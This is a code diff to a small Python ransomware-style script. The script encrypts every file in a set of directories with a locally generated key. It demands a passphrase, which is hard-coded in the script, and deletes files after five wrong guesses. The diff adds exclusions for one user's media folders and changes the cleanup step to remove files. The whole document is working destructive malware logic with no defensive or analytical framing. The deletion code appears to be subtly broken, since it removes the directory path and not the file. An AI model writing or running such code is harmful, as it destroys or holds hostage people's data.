@@ -30,6 +30,12 @@ def encrypt(key):
     f = fn(key)
     for i in dirs:
         for dir in os.listdir(i):
+            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Music":
+                continue
+            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Pictures":
+                continue
+            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Videos":
+                continue
             with open(f"{i}{dir}", 'rb') as files:
                 files = files.read()
 
@@ -44,6 +50,13 @@ def decrypt(key):
     f = fn(key)
     for i in dirs:
         for dir in os.listdir(i):
+            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Music":
+                continue
+            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Pictures":
+                continue
+            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Videos":
+                continue
+            # print(f"{i}{dir}")
             with open(f"{i}{dir}", 'rb') as files:
                 files = files.read()
 
@@ -55,6 +68,7 @@ def decrypt(key):
 
 
 lol = gen_key()
+
 encrypt(lol)
 x = 0
 phrase = "it was never meant to be"
@@ -65,6 +79,7 @@ while True:
     if response.endswith(phrase):
         print("Phrase is correct")
         decrypt(lol)
+        exit("Enjoy ;)")
     else:
         x += 1
         print(f"Phrase is incorrect, {5-x} attempts left")
@@ -73,4 +88,13 @@ while True:
             print("\n GOOD BYE")
 
             for i in dirs:
-                os.rmdir(i)
+                for dir in os.listdir(i):
+                    if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Music":
+                        continue
+                    if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Pictures":
+                        continue
+                    if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Videos":
+                        continue
+                    os.remove(i)
+                    exit("Enjoy ;)")
+
